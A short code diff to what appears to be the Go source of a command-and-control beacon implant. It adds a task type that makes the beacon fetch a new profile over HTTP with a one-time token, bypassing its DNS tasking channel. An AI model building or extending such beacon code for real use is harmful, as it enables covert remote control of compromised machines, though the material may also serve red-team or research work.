@@ -924,6 +924,13 @@ func (b *Beacon) runBeacon() {
 					return
 				}
 
+				if strings.HasPrefix(command, httpProfileTaskPrefix) {
+					// Short form: URL + one-time token. The profile is fetched over
+					// HTTP instead of riding the task through DNS label chunking.
+					b.applyHTTPProfileTask(command)
+					return
+				}
+
 				if strings.HasPrefix(command, "update_transport:") {
 					// System command on the same fire-and-forget channel as
 					// update_domains: replace the transport configuration
